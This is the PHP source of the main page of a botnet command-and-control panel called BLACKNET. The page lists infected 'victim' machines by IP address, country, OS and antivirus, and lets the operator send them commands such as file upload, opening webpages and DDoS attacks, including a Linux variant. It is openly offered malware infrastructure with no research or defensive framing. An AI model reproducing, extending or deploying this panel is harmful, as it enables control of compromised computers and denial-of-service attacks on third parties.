<?php
include 'classes/database.php';
include 'classes/clients.php';
include 'getcontery.php';
include 'session.php';

if ($login_session != $data->username){
    exit(header("Location: logout.php"));
  }
  

$client = new Clients;
$allClients = $client->getClients();

?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <link rel="shortcut icon" href="favico.png">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Botnet Coded By Black.Hacker">
    <meta name="author" content="Black.Hacker">
    <meta http-equiv="refresh" content="30">
    <title>BLACKNET - Main Interface</title>
    <link href="asset/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="asset/vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
    <link href="asset/vendor/datatables/dataTables.bootstrap4.css" rel="stylesheet">
    <link href="asset/css/sb-admin.css" rel="stylesheet">
  </head>

  <body id="page-top">
    <nav class="navbar navbar-toggleable-md navbar-dark bg-dark static-top">
      <a class="navbar-brand mr-1" href="index.php"><img src="favico.png" width="30" height="30" alt="">BLACKNET</a>
    <span class="navbar-text">
     Welcome <?php echo $login_session; ?> - [ <a href="logout.php">Logout</a> - <a href="changePassword.php">Change Password</a> ]
    </span>
    </nav>
    <div id="wrapper">
      <div id="content-wrapper">
        <div class="container-fluid">
          <ol class="breadcrumb">
            <li class="breadcrumb-item">
              <a href="#">Slaves Menu</a>
            </li>
          </ol>
          <div class="card mb-3">
            <div class="card-header">
              <i class="fas  fa-user-circle"></i>
              Bot/Slaves List</div>
          <form method="GET" action="sendcommand.php">
            <div class="card-body">
              <div class="table-responsive">
                <table class="table table-bordered" id="dataTable" width="100%" cellspacing="0">
                  <thead>
                    <tr>
                      <th>#</th>
                      <th>Victim ID</th>
                      <th>IP Address</th>
                      <th>Country</th>
                      <th>OS</th>
                      <th>Antivirus</th>
                      <th>Status</th>
                    </tr>
                  </thead>
                  <tbody>
                   <?php

                   foreach ($allClients as $ClientData){
                   echo '<tr>';
                   echo '<td><input type="checkbox" name="delete[]" value="\''.$ClientData->VicID.'\'"></td>';
                     echo '<td>'.$ClientData->VicID.'</td>';
                     echo '<td>'.$ClientData->IPAdress.'</td>';
                     echo '<td>'; 
                    if (GetContery(strtoupper($ClientData->Contery)) == "Unknown") {
                        echo '<img src="flags/X.png"> ';
                      } else {
                        echo '<img src="flags/'.$ClientData->Contery.'.png"> ';
                      }
                     echo GetContery(strtoupper($ClientData->Contery));

                     echo '</td>';
                     echo '<td>'.$ClientData->OS.'</td>';
                     echo '<td>'.$ClientData->AntiVirus.'</td>';
                 if ($ClientData->Status == "Offline") {
                        echo '<td style="text-align: center; align-content: center; color: red;"><img alt="Offline" src="imgs/offline.png"></td>';
                      } else {
                        echo '<td style="text-align: center; align-content: center; color: green;"><img alt="Online" src="imgs/online.png"></td>';
                      }
                     echo '</tr>';
                  }
                   ?>
                  </tbody>

                </table>


              </div>


            </div>

          </div>
      	    <div class="table-responsive">
                <table class="table table-bordered" id="dataTable" width="100%" cellspacing="0">
                  <thead>
                    <tr>
                      <th>Command</th>
                      <th>Execute</th>
                    </tr>
                  </thead>
                  <tbody>
               <tr>
                   <td>
                  <select class="form-control" id="command" name="command">
                    <option selected>Select Command</option>
                    <option value="Ping">Ping</option>
                    <option value="Upload File">Upload File</option>
                    <option value="Open Webpage">Open Webpage</option>
                    <option value="DDOS Attack">DDOS Attack</option>
                    <option value="DDOS Linux">DDOS Attack (Linux)</option>
                    <option value="Show Messagebox">Show Messagebox</option>
                    <option value="Print Linux">Print Message (Linux)</option>
                    <option value="Close Connection">Close Connection</option>
                    <option value="Uninstall">Uninstall</option>
                  </select>
                   </td>

                   <td>
                   	<button type="submit" class="btn btn-dark">Send Command</button>
                   </td>
                </tr>

                  </tbody>
                  
                </table>
              </div>
      </form>
        </div>
    <a class="scroll-to-top rounded" href="#page-top">
      <i class="fas fa-angle-up"></i>
    </a>
        <footer class="my-sm-10" style="display: -webkit-box; display: -ms-flexbox; background-color: #e9ecef; height: 80px; right: 0; bottom: 0;  position: absolute; display: flex; width: 100%">
          <div class="container my-auto"> 
            <div class="copyright text-center">
              <span>Copyright © BLACKNET by <a href="http://www.twitter.com/BlackHacker_511">Black.Hacker</a> - <?php echo date('Y'); ?> 
              <br></span>
            </div>
          </div>
        </footer>
    <script src="asset/vendor/jquery/jquery.min.js"></script>
    <script src="asset/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="asset/vendor/jquery-easing/jquery.easing.min.js"></script>
    <script src="asset/vendor/datatables/jquery.dataTables.js"></script>
    <script src="asset/vendor/datatables/dataTables.bootstrap4.js"></script>
    <script src="asset/js/sb-admin.min.js"></script>
    <script src="asset/js/demo/datatables-demo.js"></script>
  </body>
</html>